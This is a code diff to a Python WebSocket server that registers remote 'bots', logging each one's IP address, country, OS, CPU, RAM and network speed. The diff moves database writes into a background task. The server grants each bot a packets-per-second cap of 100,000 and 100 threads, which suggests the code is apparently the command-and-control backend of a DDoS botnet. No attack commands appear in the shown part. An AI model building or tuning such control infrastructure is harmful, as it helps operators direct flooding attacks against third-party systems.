@@ -54,20 +54,14 @@ class BotConnectionManager:
             old = self.active.get(bot_id)
             if old and old is not ws:
                 try:
-                    await old.close()
+                    await old.close(code=1000)
                 except Exception:
                     pass
             self.active[bot_id] = ws
             self._last_heartbeat[bot_id] = datetime.now(timezone.utc)
-            # Start background heartbeat checker once
             if self._hb_task is None:
                 self._hb_task = asyncio.create_task(self._start_heartbeat_checker())
-        uid = _try_uuid(bot_id)
-        if uid:
-            try:
-                await BotService.set_status(uid, "online")
-            except Exception:
-                pass
+        # DB status update offline path only — avoid slow DB on connect race
 
     async def disconnect(self, bot_id: str, ws: Optional[WebSocket] = None):
         async with self._lock:
@@ -222,64 +216,74 @@ async def handle_bot_websocket(ws: WebSocket, bot_id: str):
                         await ws.send_json({"type": "error", "message": "Invalid bot_id (must be UUID)"})
                         continue
 
-                    async with async_session() as s:
-                        bot = (await s.execute(
-                            select(Bot).where(Bot.bot_identifier == str(identifier))
-                        )).scalar_one_or_none()
+                    db_id = str(uid)
+                    # 1) Ack immediately — zero DB before this
+                    await ws.send_json({
+                        "type": "handshake_ack",
+                        "bot_id": db_id,
+                        "max_pps": 100000,
+                        "max_threads": 100,
+                        "config": {"max_pps": 100000, "max_threads": 100},
+                    })
+                    print(f"[WS] handshake_ack sent bot={db_id}")
 
-                        if not bot:
-                            bot = (await s.execute(select(Bot).where(Bot.id == uid))).scalar_one_or_none()
-
-                        if not bot:
-                            nb = Bot(
-                                id=uid,
-                                bot_identifier=str(identifier)[:128],
-                                ip_address=data.get("ip_address") or None,
-                                country=data.get("country"),
-                                os_name=(data.get("os_name") or data.get("os_version") or "Linux")[:64],
-                                cpu_cores=data.get("cpu_cores") or 1,
-                                ram_total_mb=data.get("ram_total_mb") or 0,
-                                net_speed_mbps=data.get("net_speed_mbps") or 0,
-                                status="online",
-                                first_seen_at=datetime.now(timezone.utc),
-                                last_heartbeat_at=datetime.now(timezone.utc),
-                                bot_version=(data.get("version") or "")[:32],
-                            )
-                            s.add(nb)
-                            await s.commit()
-                            db_id = str(uid)
-                        else:
-                            db_id = str(bot.id)
-                            if data.get("ip_address"):
-                                bot.ip_address = data.get("ip_address")
-                            bot.status = "online"
-                            bot.last_heartbeat_at = datetime.now(timezone.utc)
-                            if data.get("cpu_cores"):
-                                bot.cpu_cores = data.get("cpu_cores")
-                            if data.get("ram_total_mb"):
-                                bot.ram_total_mb = data.get("ram_total_mb")
-                            if data.get("os_name"):
-                                bot.os_name = data.get("os_name")
-                            elif data.get("os_version"):
-                                bot.os_name = data.get("os_version")
-                            if data.get("version"):
-                                bot.bot_version = data.get("version")
-                            await s.commit()
-
-                    # Ack first so bot enters main loop ASAP, then rebind keys
-                    try:
-                        await ws.send_json({
-                            "type": "handshake_ack",
-                            "bot_id": db_id,
-                            "max_pps": 100000,
-                            "max_threads": 100,
-                            "config": {"max_pps": 100000, "max_threads": 100},
-                        })
-                        print(f"[WS] handshake_ack sent bot={db_id}")
-                    except Exception as se:
-                        print(f"[WS] handshake_ack send fail: {type(se).__name__}: {se}")
+                    # 2) Register session keys (in-memory only)
                     await manager.rebind(session_key, db_id, ws)
                     session_key = db_id
+                    manager._last_heartbeat[session_key] = datetime.now(timezone.utc)
+
+                    # 3) Persist bot async so we never block the WS loop
+                    payload = {
+                        "identifier": str(identifier)[:128],
+                        "uid": str(uid),
+                        "ip": data.get("ip_address"),
+                        "country": data.get("country"),
+                        "os_name": (data.get("os_name") or data.get("os_version") or "Linux")[:64],
+                        "cpu_cores": data.get("cpu_cores") or 1,
+                        "ram_total_mb": data.get("ram_total_mb") or 0,
+                        "net_speed_mbps": data.get("net_speed_mbps") or 0,
+                        "version": (data.get("version") or "")[:32],
+                    }
+
+                    async def _persist_bot(p=payload):
+                        try:
+                            u = UUID(p["uid"])
+                            async with async_session() as s:
+                                bot = (await s.execute(
+                                    select(Bot).where(Bot.bot_identifier == p["identifier"])
+                                )).scalar_one_or_none()
+                                if not bot:
+                                    bot = (await s.execute(select(Bot).where(Bot.id == u))).scalar_one_or_none()
+                                if not bot:
+                                    s.add(Bot(
+                                        id=u,
+                                        bot_identifier=p["identifier"],
+                                        ip_address=p["ip"] or None,
+                                        country=p["country"],
+                                        os_name=p["os_name"],
+                                        cpu_cores=p["cpu_cores"],
+                                        ram_total_mb=p["ram_total_mb"],
+                                        net_speed_mbps=p["net_speed_mbps"],
+                                        status="online",
+                                        first_seen_at=datetime.now(timezone.utc),
+                                        last_heartbeat_at=datetime.now(timezone.utc),
+                                        bot_version=p["version"],
+                                    ))
+                                else:
+                                    if p["ip"]:
+                                        bot.ip_address = p["ip"]
+                                    bot.status = "online"
+                                    bot.last_heartbeat_at = datetime.now(timezone.utc)
+                                    bot.cpu_cores = p["cpu_cores"]
+                                    bot.ram_total_mb = p["ram_total_mb"]
+                                    bot.os_name = p["os_name"]
+                                    if p["version"]:
+                                        bot.bot_version = p["version"]
+                                await s.commit()
+                        except Exception as dbe:
+                            print(f"[WS] handshake DB persist fail: {dbe}")
+
+                    asyncio.create_task(_persist_bot())
                 except WebSocketDisconnect:
                     print(f"[WS] handshake aborted disconnect session={session_key}")
                     raise
